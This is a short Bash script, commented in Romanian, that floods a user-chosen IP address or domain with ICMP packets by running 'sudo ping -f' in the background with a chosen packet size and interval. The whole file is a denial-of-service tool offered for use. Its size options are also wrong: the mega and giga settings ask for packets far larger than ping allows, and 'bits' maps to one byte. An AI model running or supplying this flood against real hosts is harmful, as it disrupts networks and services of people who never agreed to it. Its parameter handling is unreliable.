#!/bin/bash

# Verifică dacă comanda ping este disponibilă
if ! command -v ping >/dev/null 2>&1; then
    echo "Comanda 'ping' nu este disponibilă. Asigură-te că este instalată."
    exit 1
fi

# Verifică argumentele
if [ "$#" -ne 3 ]; then
    echo "Utilizare: $0 [IP|Domeniu] [unitate] [frecvență]"
    exit 1
fi

Target=$1
Unitate=$2
Frecventa=$3

# Conversia unității în bytes
case "$Unitate" in
    b)
        PacketSize=1
        ;;
    M)
        PacketSize=1048576
        ;;
    G)
        PacketSize=1073741824
        ;;
    *)
        echo "Unitatea specificată nu este validă. Folosiți b (biti), M (Mega) sau G (Giga)."
        exit 1
        ;;
esac

# Verifică dacă frecvența este un număr pozitiv
if ! [[ "$Frecventa" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
    echo "Frecvența trebuie să fie un număr pozitiv."
    exit 1
fi

# Rularea flood-ului ping
echo "Se efectuează flood la $Target cu pachete de $PacketSize bytes la interval de $Frecventa secunde. Pentru a opri ping, apăsați Ctrl+C."
sudo ping -f -s "$PacketSize" -i "$Frecventa" "$Target" &
